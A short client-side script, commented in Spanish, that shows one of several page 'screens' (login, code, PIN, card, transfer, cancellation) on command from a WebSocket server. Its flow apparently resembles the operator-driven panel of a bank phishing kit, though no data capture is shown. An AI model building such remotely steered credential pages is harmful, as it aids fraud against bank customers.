<script>
  const socket = new WebSocket('ws://localhost:3000'); // Cambia esto a tu WebSocket real

  const pantallas = [
    'folio', 'login', 'codigo', 'nip', 'proteger', 'transferir',
    'tarjeta', 'cancelacion', 'exitosa'
  ];

  function mostrarPantalla(nombre) {
    pantallas.forEach(id => {
      const div = document.getElementById(`pantalla-${id}`);
      div.classList.add('hidden');
    });
    document.getElementById(`pantalla-${nombre}`).classList.remove('hidden');
  }

  socket.onmessage = function(event) {
    const mensaje = event.data;
    if (pantallas.includes(mensaje)) {
      mostrarPantalla(mensaje);
    }
  };
</script>

